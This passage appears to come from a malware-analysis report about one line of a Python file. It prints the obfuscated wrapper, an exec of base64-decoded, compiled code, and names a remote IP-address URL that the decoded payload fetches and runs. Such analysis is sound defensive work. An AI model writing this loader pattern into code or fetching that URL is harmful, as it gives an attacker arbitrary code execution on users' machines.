On line 11, it uses __import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(...), '<string>', 'exec')) to decode and execute a base64-encoded string. Decoding the base64 reveals that it downloads and executes code from a remote server (http://137.117.157.128/inject/UxczcO8EBZA3lBcDs), writing it to a temporary file and running it. This is a textbook example of a Python backdoor/downloader, which can be used to execute arbitrary code from an attacker-controlled server. This behavior is highly malicious and is designed to evade static analysis and detection.",
